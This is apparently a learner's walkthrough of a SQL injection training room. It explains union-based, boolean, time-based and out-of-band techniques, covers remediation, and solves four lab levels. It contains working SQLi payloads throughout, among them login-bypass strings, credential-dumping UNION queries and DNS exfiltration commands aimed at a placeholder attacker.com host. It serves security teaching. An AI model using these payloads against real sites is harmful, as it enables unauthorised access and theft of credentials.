# SQL Injection Introduction

## Task 1 - Introduction

SQL Injection (SQLi) is one of the most dangerous and well known vulnerability in web applications. It occurs when an attacker is able to modify queries sent to the database by the application. The consequences can be severe: unauthorised access to sensitive data, bypassed authentication, modified or deleted records, and in some cases, full control of the database server itself.

Despite being one of the oldest vulnerability classes in web security, SQL Injection continues to appear in modern applications. It has been at the root of numerous high-profile data breaches affecting millions of users. For a penetration tester, understanding how to identify and exploit SQLi is a fundamental skill.

### Learning Objectives

- Understand how SQL Injection vulnerabilities arise in web applications
- Identify and detect potential SQL Injection points
- Exploit In-Band SQL Injection (Error-Based and Union-Based)
- Exploit Blind SQL Injection (Authentication Bypass, Boolean-Based, and Time-Based)
- Understand Out-of-Band SQL Injection techniques
- Apply remediation strategies to prevent SQL 

---

## Task 2 - SQL Essentials For Injection

Before diving into SQLi lets understand some basics first which are crucial for injection payloads.

### SQL Comments

Comments in a programming language tells the compiler/interpretor to ignore whatever comes next. Similarly, here it tells the database to ignore everything that follows next. In MySQL for single line comments we can use `--` or `#` and for multiline comments we can use `/**/`.

When we inject in middle of a query we can ignore the remaining query by using comments like:

`SELECT * FROM users WHERE username='INPUT' AND password='secret';`

If we want to login as `admin` without the password we can do the following:

`SELECT * FROM users WHERE username='admin'-- AND password='secret';`

Everything after `--` is ignored, so the password check never runs.

### UNION

The `UNION` operator combines the results of two or more `SELECT` statements into a single result set. But for this we reuqire that both the SELECT statements must return the same number of columns and the columns should have compatible data types.

`SELECT name, age FROM students UNION SELECT username, id FROM admins`

Attackers leverage UNION statements to combine their own query with alegitimate SQL qeury, pulling data from entirely different tables. 

### LIKE and WildCards

The `LIKE` operator is used to perfrom pattern matching for string data type. There are two types of operators here:

- `%` operator used for WildCard matching for a sequence of chars
- `_` operator to match exactly one character

For e.g, `SELECT * FROM users WHERE username LIKE 'adm%';` will return all usernames starting with `adm` like `admin` and `administrator`.

In Blind SQL Injection, attackers use `LIKE` with wildcards to enumerate data one character at a time, testing LIKE `'a%'`, LIKE `'b%'`, and so on until they find a match.

### LIMIT

The `LIMIT` claude is used to limit the number of rows returned in response to a query.

**Syntax:** `LIMIT offset, count`

```
SELECT * FROM users LIMIT 1;       -- returns only the first row

SELECT * FROM users LIMIT 2, 1;    -- skips 2 rows, returns the 3rd
```

In injection payloads, `LIMIT` is often used to control which row is returned or to prevent the output from being overwhelmed by too many results.

### String Functions

When extracting data through Injection attacks two functions are useful:

- `group_concat():` This function aggregates values from multiple rows into a single comma seperated values. So instead of multiple rows you get the desired result in a single row.

    ```
    SELECT group_concat(username, ':', password SEPARATOR '<br>') FROM users;

    -- Returns:             admin:pass123<br>martin:secret<br>jim:work456
    ```


- `CONCAT():` This function combines multiple individual values from a single row

    `CONCAT(username, ':', password) produces admin:pass123 for a single row.`

### The information_schema Database

Every database MYSQL, MariaDB, PosgresSQL has a builtin database called `information_schema` that stores info about all the tables and databases on the server.

Two tables within information_schema are particularly valuable during SQL Injection:

- `information_schema.tables:` lists every table. The table_schema column holds the database name, and table_name holds the table name.
- `information_schema.columns:` lists every column. The table_name and column_name columns let you discover the structure of any table.

> Note: This room uses MySQL syntax throughout. Other database engines (MSSQL, PostgreSQL, SQLite, Oracle) have their own variations: different comment syntax, different system tables, and different functions. The core concepts transfer, but the exact payloads differ.

### Answer the questions below

- What SQL statement combines results from two SELECT queries into one result set?

    `UNION`

- What built-in database contains metadata about all other databases, tables, and columns in MySQL?

    `information_schema`

---

## Task 3 - What is SQL Injection

SQL Injection occurs when the web application injects user supplied input directly into an SQL query without proper sanitisation or parameterisation. This results in the user inputbeing treated as SQL code rather than data allowing the manipulation of query logic in unintended ways.

### How Web Applications Use SQL 

When we browse a website, many of the pages you see are generated dynamically from a database. Consider a blog application where each article has a unique ID. When we visit `https://website.thm/article?id=1`, the web server takes the value 1 from the URL and inserts it into a SQL query:

`SELECT * FROM articles WHERE id = 1 AND public = 1;`

The database returns the article with ID 1 (if it's public), and the web server renders it into the page you see. This is how most data-driven web applications work, user input is passed to SQL queries, and the results are returned to the user.

### Where the Vulnerability Lives

The problem arises when the application builds the query directly from the user input like in the following server side code:

`$query = "SELECT * FROM articles WHERE id = " . $_GET['id'] . " AND public = 1;";`

Whatever we put in `id` parameter is a direct part of the SQL query. If we change the URL from `id=1` to `id=1 OR 1=1--`, the query becomes:

`SELECT * FROM articles WHERE id = 1 OR 1=1-- AND public = 1;`

The `OR 1=1--` enables us to skip the `public=1` check completely and we can view all the articles which are not public (private) as well.

### Three Types Of SQL Injection

SQL Injection techniques are categorised based on how the attacker receives feedback from the database:

#### In-Band SQL Injection 

This is when the results of the injection are returned directly in the web application's response. This is the most straightforward type. It has two subtypes:

- **Error-Based:**  The database returns error messages that reveal information about its structure.

- **Union-Based:** The attacker uses UNION to append a second query and extract data through the page output.

**Blind SQL Injection** 

Blind SQL is when the application does not display query results or error messages. The attacker must infer information from indirect signals:

- **Authentication Bypass:** The login succeeds or fails based on the injected query.
- **Boolean-Based:** The application's response changes subtly (e.g., different content, true/false) based on whether a condition is true.
- **Time-Based:** The attacker uses SLEEP() to introduce a time delay and observes whether the response is slow (true) or fast (false).

**Out-of-Band SQL Injection**

This is when the attacker causes the database server to make an external network request (e.g., a DNS lookup) that exfiltrates data through a separate channel. This is used when neither in-band nor blind techniques are viable.

### Detecting SQL Injection

Before you can exploit SQL Injection, we need to find it. As a penetration tester, we should test every input that interacts with the database. Common injection points include URL parameters, form fields (login, search, comment boxes), cookies, and HTTP headers.

The simplest detection method is to inject test characters and observe the response:

- **Enter a single quote `'`:** if the application returns a database error, the input is likely being inserted into a SQL query without proper handling.
- **Try `"` (double quote):** some queries use double quotes instead of single quotes.
- **Enter `;--`:**  if the application behaves differently (e.g., returns different content), the comment syntax is being processed.
- **Test `OR 1=1`:** if it changes the results, the input is directly in the query's logic.

Not every test will produce a visible error. If the application suppresses errors, you may need to rely on behavioural differences (Boolean-Based) or timing delays (Time-Based) to confirm injection.

### Answer the questions below

- What character is commonly used as a first test when probing for SQL Injection?

    `'`

- What type of SQL Injection returns results directly in the web page?

    `In-Band`

---

## Task 4 - In-Band SQL Injection

This is the most common and easy to exploit category. The term In-Band means that the response is received on the same channel which was used to send the request.

### Error-Based SQL Injection

Error-Based SQL Injection exploits database error messages displayed to the user. When a web application is misconfigured and shows raw database errors, these messages often leak valuable information about the query structure, table names, and even data.

For example, injecting a single quote `'` into a vulnerable parameter might produce an error like:

`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' at line 1`

This tells us that the database being used is MySQL, the input is wrapped in single qoutes and the application doesnt handle errors gracefully. From here, you can craft more precise payloads to extract information through deliberate error messages.

While Error-Based Injection can reveal structural information, Union-Based Injection is the primary method for extracting large amounts of data.

### Union-Based SQL Injection

Union-Based SQLi uses the `UNION` operator to append our own `SELECT` query to the original one, pulling data from any table the database user has access to. The methodology follows a consistent series of steps.

**Step 1: Determine the number of columns:**

First we need to determine the number of columns needed as UNION requires both queries to have the same number of columns. We can check this by using `UNION SELECT` with an incrementing number of values until the error disappears:

```
1 UNION SELECT 1          -- error (wrong column count)
1 UNION SELECT 1,2        -- error (still wrong)
1 UNION SELECT 1,2,3      -- success! The table has 3 columns
```

**Step 2: Identify which columns are displayed:**

Now we need to identify which columns can be displayed as not all columns are allowed to be visible we can simply check this by changing the original query value to something that doesnt returns a result like `0`:

`0 UNION SELECT 1,2,3`

The number that will appear on the page will tell you which columns is visible (for e.g, if `3` appears this will be our extraction column).

**Step 3: Extract the database name:**

Then we replace that column with the `database()` function to get the database name:

`0 UNION SELECT 1,2,database()`

**Step 4: Enumerate tables:**

Then we can leverage the `information_schema` to get the tables in the target database:

`0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'database_name'`

**Step 5: Enumerate columns:**

Once we identify the target table (like `users`) we can enumerate that to get the column names:

`0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'target_table'`

**Step 6: Extract data:**

Then we can move on finally to extract the relevant data from that table:

`0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM target_table`

### Answer the questions below

- What subtype of In-Band SQLi relies on database error messages to extract information?

    `Error-Based`

- What SQL function returns the name of the current database in MySQL?

    `database()`

---

## Task 5 - Blind SQL Injection : Authentication Bypass

Blind SQL Injection is when the database doesnot return any result or error in response to the sql injection. The injection still works and the databse processes the malicious input but there is no direct way to see the output.

So, instead of looking for response we can infer the result from the application's behaviour (like if the login succeeded, or did the page content changed or the response took longer).

Authentication bypass is the most intuitive example of Blind SQLi. We never see the database output, because you only see whether you're logged in or not.

### How Authentication Queries Work

Most login forms work by sending the username and password to the server, which constructs a query like:

`SELECT * FROM users WHERE username='bob' AND password='secret123' LIMIT 1;`

The application checks whether this query returns any rows. If it returns a row, the credentials are valid, and you're logged in. If it returns nothing, the login fails. The application never displays the actual query results. It either redirects you to a dashboard or shows "Invalid credentials."

### The Attack

The key insight is that we don't need to know a valid username or password. We just need to make the query return at least one row. Consider what happens if you enter the `username '` OR `1=1;--` and anything in the password field. The server constructs:

`SELECT * FROM users WHERE username='' OR 1=1;--' AND password='anything' LIMIT 1;`

Let's break down what happens:

**`username=''`:** checks for an empty username (no match)

**`OR 1=1`:** this is always true, so the entire WHERE clause becomes true

**`;--`:** the semicolon ends the statement, and `--` comments out everything after it, including the password check

The database returns every row in the users table
The application sees that rows were returned and logs us in as the first user (often the admin account)

### Targeting a Specific User

Sometimes we want to log in as a specific account rather than whoever happens to be at the top of the table. If we know the admin's username, we can inject `admin'--`, which produces:

`SELECT * FROM users WHERE username='admin'--' AND password='anything' LIMIT 1;`

The password check is completely commented out. The database returns the admin row, and we are logged in as admin without needing the password.

### Variations

The exact payload depends on the query structure. Some things to try:

- `' OR 1=1;--` is classic bypass, works when the username is wrapped in single quotes
- `' OR 1=1#` this uses # as the comment character (MySQL alternative)
- `" OR 1=1--` for queries that use double quotes around the input

Try both the username and password fields:  some applications only concatenate one of them into the query, so the vulnerable field may vary

### Detection in the Field

When testing a login form during a penetration test, authentication bypass is one of the first things to try. Enter `'` OR `1=1;--` in the username field and any string in the password field. If we get logged in, the form is vulnerable to SQL Injection.

### Answer the questions below

- What boolean condition is commonly injected to make a WHERE clause always evaluate to true?

    `1=1`

---

## Task 6 - Blind SQL Injection : Boolean and Time Based

Authentication Bypass gets us past through login, but if we want to extract data then we use Boolean and Time based SQLi.

### Boolean-Based Blind SQL Injection

In Boolean based sqli the application returns a single true/false boolena value like a JSON response `{"taken": true}` / `{"taken": false}` or a subtle change in HTML. 

Imagine a username-check feature that tells you whether an account exists. `https://website.thm/checkuser?username=admin` returns `{"taken":true}` because admin is taken. `?username=admin123` returns `{"taken": false}` because that user does not exist.

If this input is injectable, the backend query probably looks like:

`SELECT * FROM users WHERE username = '%username%' LIMIT 1;`

By injecting a `UNION SELECT` with a condition, you can ask the database arbitrary yes/no questions and read the answer from the true/false response.

**Step 1: Confirm injection:**

First we inject a condition that is always true.

`admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--`

**Step 2: Guess the database name, character by character:**

Then we try to guess the name of the databse character by character:

`admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'a%';--`

False? Not `'a'`. Try `b%`, `c%`, keep going. When the response flips to true, we have found the first letter. Then move to the second character: `sa%`, `sb%`, `sc%`, etc. and keep narrowing until we have the full name.

**Step 3: Get table and column names:**

Then we use the same technique of Step 2 against the information schema to get the table and column names:

`admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'db_name' AND table_name LIKE 'a%';--`

### Time-Based Blind SQL Injection

In Time-Based Blind SQLi the application gives no signal that the injection works, the HTML content remains same, same headers and same status code. So we have to see that how long the respose took to guess the success.

MySQL's `SLEEP` function comes in handy here as it can be utilized for stopping execution for a set number of seconds. We can combine a condition with it and see if the database pauses for the specified time.

`admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 's%';--`

If the database name starts with 's', the response takes around 5 seconds. If not, it comes back right away.

#### Step 1: Find the column count:

Same idea as Union-Based. Try UNION SELECT SLEEP(5) and add columns until you see a delay:

```
admin123' UNION SELECT SLEEP(5);--        -- no delay (wrong count)

admin123' UNION SELECT SLEEP(5),2;--      -- 5 second delay (2 columns!)
```

#### Step 2: Enumerate data:

The process is identical to the Boolean-Based one: cycle through characters with LIKE. But instead of checking the page content, you watch the clock. Delay means true. No delay means false.

> Note: Network latency can mess with time-based detection. On a flaky connection, a natural lag might look like a successful SLEEP(). Use longer sleep values (5-10 seconds) and test each character a couple of times to be sure. On MSSQL, the equivalent is `WAITFOR DELAY '0:0:5'`.

### When To Use Which

App shows different content for true / false **--> Boolean-Based**
App response looks identical no matter what **--> Time-Based**
Time-based is blocked or too unreliable	**--> Out-of-Band** (next task)

### Answer the questions below

- What MySQL function causes a deliberate time delay in a query's response?

    `SLEEP`

---

## Task 7 - Out-Of-Band SQL Injection

Out-Of-Band SQL Injection works different. Instead of reading the app's response we force the server to trasfer data to our controlled server through a seperate channel, usually DNS or HTTP.

### When You Need Out-Of-Band

OOB comes into play when everything else has failed:

- In-Band is off the table because the app does not show query results or errors.
- Boolean-Based does not work because the response looks the same regardless of the condition.
- Time-Based is unreliable because the network is too noisy, or SLEEP() is blocked.
- But the database server can make outbound connections. That last point is the requirement. If the firewall blocks all outbound traffic from the DB server, OOB is dead in the water.

You will not use OOB as often as In-Band or Blind, but when you hit a target where every other avenue is shut down, and the database has network access, it can be the only way to get data out.

### How It Works

Two channels are involved:

- **The attack channel:** your normal web request with the injection payload.
- **The data channel:** an outbound network request (DNS or HTTP) that the database server makes to your server, with the exfiltrated data baked into the request itself.

### DNS Exfiltration With MySQL

The most common technique is to do DNS enumeration using the `LOAD_FILE` function in MYSQL which triggers a DNS lookup. We embed the data we want as subdomain.

`SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\share'));`

The process:

- `(SELECT database())` pulls the database name. Let's say it is `webapp_db`.
- `CONCAT()` builds the string `\\webapp_db.attacker.com\share`.
- `LOAD_FILE()` tries to read that file path. On Windows, this initiates a DNS lookup for `webapp_db.attacker.com`.
- Our DNS server catches the request and logs webapp_db. The data is in the subdomain.

This works best on Windows-based MySQL servers where UNC paths trigger DNS resolution.

### MSSQL Techniques

Microsoft SQL Server has stored procedures that make OOB more direct:

`xp_dirtree` triggers a DNS lookup by trying to list a directory on a remote server:

`EXEC master..xp_dirtree '\\attacker.com\share';`

`xp_cmdshell` (if it is enabled) runs OS commands directly, so we can use nslookup or curl to ship data out:

`EXEC xp_cmdshell 'nslookup data.attacker.com';`

xp_cmdshell is off by default in modern MSSQL, but xp_dirtree is still available and gets used regularly in pentests.

### Receiving the Data

You need something listening on our end to catch what the database sends. A few options:

- `Burp Collaborator` gives a unique subdomain and logs any DNS or HTTP requests to it. Inject the Collaborator domain into your payload, check the Collaborator tab for callbacks.
- `Interactsh` from ProjectDiscovery does the same thing but is free and can be self-hosted.
- A custom listener, like a Python DNS server with dnslib or a bare-bones HTTP server, if you want full control.

### Limitations

OOB has constraints worth knowing about:

- The database server needs outbound network access (many production setups restrict this).
- Payloads are database-engine-specific. MySQL, MSSQL, and PostgreSQL each need different syntax.
- DNS exfiltration has a size limit: subdomain labels are limited to 63 characters each.
- It is generally slower and flakier than pulling data directly.

### Answer the questions below

- What protocol beginning with D is commonly used to exfiltrate data in Out-of-Band SQLi?

    `DNS`

- What MSSQL stored procedure can be used to trigger DNS lookups for data exfiltration?

    `xp_dirtree`

---

## Task 8 - Remediation and Prevention

Knowledge of exploiting SQLi is essential but we also need to know the remediation steps needed. 

### Prepared Statements (Parameterised Queries)

Prepared statements are the primary remediation step for avoiding SQLi. They seperate SQL code from user data. 

#### Vulnerable PHP Code:

```
$query = "SELECT * FROM users WHERE username='" . $_POST['username'] . "'";

$result = mysqli_query($conn, $query);
```

User input directly gets concatenated into the query string. An attacker can escape quotes and inject whatever they want.

#### Fixed With Prepared Statements (PDO):

```
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");

$stmt->execute([$_POST['username']]);

$result = $stmt->fetchAll();
```

The `?` sign here acts as a placeholder. Whatever, the user enters `' OR 1=1--` it gets treated as a literal string.

#### Vulnerable Python Code:

```
query = f"SELECT * FROM users WHERE username='{username}'"

cursor.execute(query)
```

#### Fixed:

```
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
```

`%s` is a parameter placeholder. The MySQL connector handles escaping and binding for you.

Every language and framework supports this pattern. Define the query with placeholders, and pass user input as parameters. SQL Injection is gone because the input physically cannot change the query structure.

### Input Validation

Input validation controls what the application accepts before anything reaches the database. The best approach is allowlisting: define exactly what is valid and reject everything else.

If a parameter should be a numeric article ID, check it:

```
if (!ctype_digit($_GET['id'])) {
    die("Invalid input");
}
```

Never rely on validation alone. Use it alongside prepared statements. Blocklisting (trying to filter out characters like ' or --) is brittle. Attackers will find ways around your filter. Double encoding, alternate syntax, something you did not think of.

### Escaping User Input

Escaping means putting a backslash before special characters so the database treats them as literals instead of syntax. `'` becomes `\'`.

It can stop basic injection, but is fragile and database-specific. Every engine has different special characters and escaping rules. It should be used as a last option in cases where refactoring code for prepared statements is expensive.

### Principle of Least Privilege

This is particularly useful to use side by side with the good input handling. The database account should have the bare minimum permissions so that the risk factor is minimized.

- Read-only application? The account gets SELECT privileges and nothing else.
- Never connect as root or sa from the application.
- Lock down access to sensitive tables so only the procedures that need them can reach them.

If someone does exploit SQL injection through a low-privilege account, they cannot `DROP` tables, access other databases, or run system commands.

### Web Application Firewalls (WAFs)

WAF inspects incoming requests and blocks known attack patterns `' OR 1=1`, `UNION SELECT`, `information_schema`.

But WAF alone is not enough. They should be a part of defense in depth strategy not as a replacement of secure code.

### Answer the questions below

- What is the primary and most effective defence against SQL Injection?

    `Prepared Statements`

---

## Task 9 - Practical

### Level 1: Union-Based SQL Injection

So our target application is a mock browser on `http://<Machine_IP>/level1`

The SQL query box shows the follwoing query:

`select * from article where id =`

#### Step 1 - Find Column Count

So let try to find the column count needed. For that we will append the following query in the URL after id parameter:

`UNION SELECT 1`

This isnt the right column count so increase it one by one:

`UNION SELECT 1,2`

Try 3:

`UNION SELECT 1,2,3` 

and this time the article loads.

#### Step 2 - Find Visible Column

Now we will find which column is visible so we change the id parameter value from `1` to `0`:

`0 UNION SELECT 1,2,3`

With a valid ID like 1, the legitimate article row fills the page, and our injected row gets pushed aside. Setting it to 0 returns no real article, so only our UNION output renders. The values 1, 2, and 3 appear on the page.3 shows up in the content area, which is the column we will use for extraction.

#### Step 3 - Get the database name

Now we will replace the third column with the `database()` function to extract the database() name:

`0 UNION SELECT 1,2, database()`

#### Step 4 - List tables

Now we will list down the table name from information_schema:

```
0 UNION SELECT 1,2, group_concat (table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```

We can now see two table names of which `staff_users` seems interesting.

#### Step 5 - List Columns in the Target Table

Now we can list down columns from the `staff_users` table by the following query:

```
0 UNION SELECT 1,2, group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
```

We will get three columns in result: id, username and password.

#### Step 6 - Extract Credentials

Now we can move forward to getting the usernames and passwords, so we can use a simple query to dump down the data from username and password column:

```
UNION SELECT 1,2, group_concat(username, ":" , password) FROM staff_users
```

This will give us the follwoing result:

![username and passwords](../Images/Web%20Application%20Vulnerabilities%20I/SQL%20Injection%20Introduction/level1%20passwords%20dump.png)

Just login with martin's password and the flag will be displayed.

### Level 2: Authentication Bypass

So in this level we have a login form and the query box shows the following query:

```
select * from users where username='' and password='' LIMIT 1;
```

Here the application's behaviour will determine the outcome so its a blind sqli case. 

To solve this enter `' OR 1=1;--` in the username field and leave the password field empty. The query becomes:

```
select * from users where username='' OR 1=1;--' and password='' LIMIT 1;
```

![auth login](../Images/Web%20Application%20Vulnerabilities%20I/SQL%20Injection%20Introduction/auth%20bypass.png)

The password field is irrelevant because -- removes it from the query before the database ever evaluates it.

Upon clicking login we will be displayed a login success message and then Clicking on level 3 will display the flag.

![login succeeded](../Images/Web%20Application%20Vulnerabilities%20I/SQL%20Injection%20Introduction/auth%20bypass%20success%20msg.png)

### Level 3: Boolean-Based Blind SQLi

In this level 3 we have two browsers, one with a checkuser api `https://website.thm/checkuser?username=admin` raturning `{"taken":true}` and a login form to be used later.

If we execute the query in the api browser, the sql query bos shows the following:

`select * from users where username = '%username%' LIMIT 1;`

There is no data in the page output. Our only feedback is {"taken":true} or {"taken":false}. That binary signal is all we need. We can use it to ask the database yes/no questions and extract content one character at a time.

#### Step 1: Confirm injection

First step is to confirm whether a boolean blind sqli exist or not. We can confirm by appending the following query:

```
' UNION SELECT 1,2,3 where database() like '%';--
```

`%` is a wildcard that matches anything, so this condition is always true. Response: {"taken":true}. Injection is confirmed and working.

#### Step 2: Get the database name, letter by letter

Now we can extract the database name letter by letter using the `LIKE` operator.

```
admin123' UNION SELECT 1,2,3 where database() like 'a%';--
```

This returns `{"taken":false}`. Not 'a'. Try `s%`:

```
admin123' UNION SELECT 1,2,3 where database() like 's%';--
```

This returns `{"taken":true}`. First letter is `s`. Fix that and test the second character:

```
admin123' UNION SELECT 1,2,3 where database() like 'sa%';--   {"taken":false}

admin123' UNION SELECT 1,2,3 where database() like 'sq%';--   {"taken":true}
```

Keep checking for more characters like this and the final name will be `sqli_three`.

![database name](../Images/Web%20Application%20Vulnerabilities%20I/SQL%20Injection%20Introduction/db%20name%20boolean%20based.png)

#### Step 3: Find table names

Now lets test table names from `information_schema.tables`:

```
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'u%';--
```

This will return `{"taken":true}`. Something starts with 'u'. Keep going: `us%` (true),use% (true),user% (true), users with no wildcard (true). Now we know the table name: `users`.

![table name](../Images/Web%20Application%20Vulnerabilities%20I/SQL%20Injection%20Introduction/users%20table%20boolean%20based.png)

#### Step 4: Get column names

```
admin123' UNION SELECT 1,2,3 FROM information_schema.columns WHERE table_name = 'users' and column_name like 'u%';--
```

By this approach we can find two columns `username` and `password`

#### Step 5: Extract the username

```
admin123' UNION SELECT 1,2,3 from users where username like 'a%';--
```

`{"taken":true}`. Keep going: ad%, adm%, admi%, admin with no wildcard (true). We’ve now got the username: `admin`

![username admin](../Images/Web%20Application%20Vulnerabilities%20I/SQL%20Injection%20Introduction/username%20boolena%20based.png)

#### Step 6: Extract the password.

```
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like '3%';--
```

![password 3845](../Images/Web%20Application%20Vulnerabilities%20I/SQL%20Injection%20Introduction/password%20boolena%20based.png)

Work through the same way. The password is `3845`.

#### Step 7 

In this we simply use the above obtained credentials to login to the form below:

### Level 4: Time-Based Blind SQLi

The setup here is similar to level 3 but the injection here is present in the referrer header. Also important to note here is that the response looks almost identical regardless of whether condition is true or false.

The only signal here is how long the response takes to arrive.

#### Step 1: Find the column count

To know this append this query:

```
' UNION SELECT SLEEP(5);--
```

Response will come back immediately, so the SLEEP(5) doesnt fire. Increase one column:

```
' UNION SELECT SLEEP(5),2;--
```

A 5-second pause before the response arrives. The table has 2 columns. The SLEEP() only runs when the UNION column count is correct, so the delay itself confirms both the injection and the column count.

#### Step 2: Get the database name

Now we can extract the database name character by character and watch if the 5 seconds delay occurs or not.

```
' UNION SELECT SLEEP(5),2 where database() like 's%';--
```

If a delay occurs of 5 seconds, then move on to the next position:

```
admin123' UNION SELECT SLEEP(5),2 where database() like 'sq%';--
```

Do this until the whole name has been extracted:

#### Step 3: Enumerate tables and columns

Here we will use the same procedure as Level 3. Testing the characters individually and looking for delays. 

```
admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'u%';--
```

![table name time based](../Images/Web%20Application%20Vulnerabilities%20I/SQL%20Injection%20Introduction/table_name%20time%20based.png)

Same method can be utilized to enumerate columns from `information_schema.columns`.

![column name time based](../Images/Web%20Application%20Vulnerabilities%20I/SQL%20Injection%20Introduction/column%20name%20time%20based.png)

![password column time based](../Images/Web%20Application%20Vulnerabilities%20I/SQL%20Injection%20Introduction/password%20column%20time%20based.png)

#### Step 4: Extract the admin password

```
admin123' UNION SELECT SLEEP(3),2 from users where username='admin' and password like '4%';--
```

3-second delay: first character is 4. Then `49%` (delay),`496%` (delay),`4961%` (delay),`4961` with no wildcard (delay). We now have the password: `4961`.

![username and password time based](../Images/Web%20Application%20Vulnerabilities%20I/SQL%20Injection%20Introduction/username%20and%20password%20time%20based.png)

Every character needs multiple requests, and every true condition means sitting through the sleep timer. That is time-based blind SQLi. It is the slowest technique here, but it works when there is nothing else to read from the response.

#### Step 5: Login

Now we can simply enter admin and password 4961 in the login form and click Login to get the final flag.

![final flag](../Images/Web%20Application%20Vulnerabilities%20I/SQL%20Injection%20Introduction/final%20flag.png)

---